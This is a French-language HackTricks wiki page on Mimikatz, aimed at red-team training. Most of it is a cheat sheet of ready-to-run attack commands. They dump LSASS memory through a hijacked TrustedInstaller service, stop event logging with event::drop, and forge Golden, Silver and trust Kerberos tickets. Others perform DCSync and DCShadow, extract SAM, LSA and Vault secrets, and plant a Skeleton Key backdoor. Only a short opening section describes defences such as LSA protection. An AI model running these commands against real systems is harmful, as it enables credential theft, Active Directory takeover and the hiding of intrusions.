# Mimikatz

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Approfondissez votre expertise en **Sécurité Mobile** avec 8kSec Academy. Maîtrisez la sécurité iOS et Android grâce à nos cours à votre rythme et obtenez une certification :

{% embed url="https://academy.8ksec.io/" %}


**Cette page est basée sur une de [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Consultez l'original pour plus d'informations !

## LM et mots de passe en clair en mémoire

Depuis Windows 8.1 et Windows Server 2012 R2, des mesures significatives ont été mises en œuvre pour protéger contre le vol de credentials :

- **Les hachages LM et les mots de passe en clair** ne sont plus stockés en mémoire pour améliorer la sécurité. Un paramètre de registre spécifique, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ doit être configuré avec une valeur DWORD de `0` pour désactiver l'authentification Digest, garantissant que les mots de passe "en clair" ne sont pas mis en cache dans LSASS.

- **La protection LSA** est introduite pour protéger le processus de l'Autorité de Sécurité Locale (LSA) contre la lecture non autorisée de la mémoire et l'injection de code. Cela est réalisé en marquant LSASS comme un processus protégé. L'activation de la protection LSA implique :
1. Modifier le registre à _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` sur `dword:00000001`.
2. Mettre en œuvre un objet de stratégie de groupe (GPO) qui impose ce changement de registre sur les appareils gérés.

Malgré ces protections, des outils comme Mimikatz peuvent contourner la protection LSA en utilisant des pilotes spécifiques, bien que de telles actions soient susceptibles d'être enregistrées dans les journaux d'événements.

### Contrebalancer la suppression de SeDebugPrivilege

Les administrateurs ont généralement SeDebugPrivilege, leur permettant de déboguer des programmes. Ce privilège peut être restreint pour empêcher les dumps de mémoire non autorisés, une technique courante utilisée par les attaquants pour extraire des credentials de la mémoire. Cependant, même avec ce privilège supprimé, le compte TrustedInstaller peut toujours effectuer des dumps de mémoire en utilisant une configuration de service personnalisée :
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Cela permet de vider la mémoire de `lsass.exe` dans un fichier, qui peut ensuite être analysé sur un autre système pour extraire des identifiants :
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Options Mimikatz

La falsification des journaux d'événements dans Mimikatz implique deux actions principales : effacer les journaux d'événements et patcher le service d'événements pour empêcher l'enregistrement de nouveaux événements. Voici les commandes pour effectuer ces actions :

#### Effacement des Journaux d'Événements

- **Commande** : Cette action vise à supprimer les journaux d'événements, rendant plus difficile le suivi des activités malveillantes.
- Mimikatz ne fournit pas de commande directe dans sa documentation standard pour effacer les journaux d'événements directement via sa ligne de commande. Cependant, la manipulation des journaux d'événements implique généralement l'utilisation d'outils système ou de scripts en dehors de Mimikatz pour effacer des journaux spécifiques (par exemple, en utilisant PowerShell ou le Visualiseur d'Événements Windows).

#### Fonctionnalité Expérimentale : Patcher le Service d'Événements

- **Commande** : `event::drop`
- Cette commande expérimentale est conçue pour modifier le comportement du Service d'Enregistrement des Événements, empêchant effectivement l'enregistrement de nouveaux événements.
- Exemple : `mimikatz "privilege::debug" "event::drop" exit`

- La commande `privilege::debug` garantit que Mimikatz fonctionne avec les privilèges nécessaires pour modifier les services système.
- La commande `event::drop` patch alors le service d'enregistrement des événements.


### Attaques de Tickets Kerberos

### Création de Golden Ticket

Un Golden Ticket permet une usurpation d'accès à l'échelle du domaine. Commande clé et paramètres :

- Commande : `kerberos::golden`
- Paramètres :
- `/domain` : Le nom de domaine.
- `/sid` : L'Identifiant de Sécurité (SID) du domaine.
- `/user` : Le nom d'utilisateur à usurper.
- `/krbtgt` : Le hachage NTLM du compte de service KDC du domaine.
- `/ptt` : Injecte directement le ticket dans la mémoire.
- `/ticket` : Enregistre le ticket pour une utilisation ultérieure.

Exemple :
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Création de Silver Ticket

Les Silver Tickets accordent l'accès à des services spécifiques. Commande clé et paramètres :

- Commande : Semblable au Golden Ticket mais cible des services spécifiques.
- Paramètres :
- `/service` : Le service à cibler (par exemple, cifs, http).
- Autres paramètres similaires au Golden Ticket.

Exemple :
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Création de Ticket de Confiance

Les Tickets de Confiance sont utilisés pour accéder aux ressources à travers les domaines en tirant parti des relations de confiance. Commande clé et paramètres :

- Commande : Semblable au Golden Ticket mais pour les relations de confiance.
- Paramètres :
- `/target` : Le FQDN du domaine cible.
- `/rc4` : Le hash NTLM pour le compte de confiance.

Exemple :
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Commandes Kerberos supplémentaires

- **Lister les tickets** :
- Commande : `kerberos::list`
- Liste tous les tickets Kerberos pour la session utilisateur actuelle.

- **Passer le cache** :
- Commande : `kerberos::ptc`
- Injecte des tickets Kerberos à partir de fichiers de cache.
- Exemple : `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Passer le ticket** :
- Commande : `kerberos::ptt`
- Permet d'utiliser un ticket Kerberos dans une autre session.
- Exemple : `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purger les tickets** :
- Commande : `kerberos::purge`
- Efface tous les tickets Kerberos de la session.
- Utile avant d'utiliser des commandes de manipulation de tickets pour éviter les conflits.


### Manipulation d'Active Directory

- **DCShadow** : Faire temporairement agir une machine comme un DC pour la manipulation d'objets AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync** : Imiter un DC pour demander des données de mot de passe.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accès aux informations d'identification

- **LSADUMP::LSA** : Extraire des informations d'identification de LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync** : Usurper un DC en utilisant les données de mot de passe d'un compte d'ordinateur.
- *Aucune commande spécifique fournie pour NetSync dans le contexte original.*

- **LSADUMP::SAM** : Accéder à la base de données SAM locale.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets** : Déchiffrer les secrets stockés dans le registre.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM** : Définir un nouveau hachage NTLM pour un utilisateur.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust** : Récupérer des informations d'authentification de confiance.
- `mimikatz "lsadump::trust" exit`

### Divers

- **MISC::Skeleton** : Injecter un backdoor dans LSASS sur un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalade de privilèges

- **PRIVILEGE::Backup** : Acquérir des droits de sauvegarde.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug** : Obtenir des privilèges de débogage.
- `mimikatz "privilege::debug" exit`

### Dumping d'informations d'identification

- **SEKURLSA::LogonPasswords** : Afficher les informations d'identification des utilisateurs connectés.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets** : Extraire des tickets Kerberos de la mémoire.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulation de SID et de jetons

- **SID::add/modify** : Changer SID et SIDHistory.
- Ajouter : `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modifier : *Aucune commande spécifique pour modifier dans le contexte original.*

- **TOKEN::Elevate** : Usurper des jetons.
- `mimikatz "token::elevate /domainadmin" exit`

### Services Terminal

- **TS::MultiRDP** : Permettre plusieurs sessions RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions** : Lister les sessions TS/RDP.
- *Aucune commande spécifique fournie pour TS::Sessions dans le contexte original.*

### Coffre

- Extraire des mots de passe du Windows Vault.
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Approfondissez votre expertise en **Sécurité Mobile** avec 8kSec Academy. Maîtrisez la sécurité iOS et Android grâce à nos cours auto-dirigés et obtenez une certification :

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
